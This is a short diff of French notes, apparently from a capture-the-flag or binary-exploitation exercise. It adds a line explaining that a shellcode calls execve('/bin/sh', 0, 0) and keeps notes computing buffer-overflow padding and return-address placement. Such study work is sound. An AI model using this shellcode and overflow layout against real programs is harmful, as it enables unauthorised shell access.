@@ -72,6 +72,7 @@ Quand on rentre quoique ce soit, ca le renvoie
                                                 ECX = 0 (second arg)
                                                 EDX = 0 (troisieme arg)
 cd 80          int 0x80             (déclenche le syscall numero 11)
+soit execve("/bin/sh", 0, 0);
 
 buffer est à (ebp-0x4c) donc 76 octets de ebp, on a 21 octets de shellcode on remplie avec 59 octets en laissant 4 octets pour l'adresse retour
 
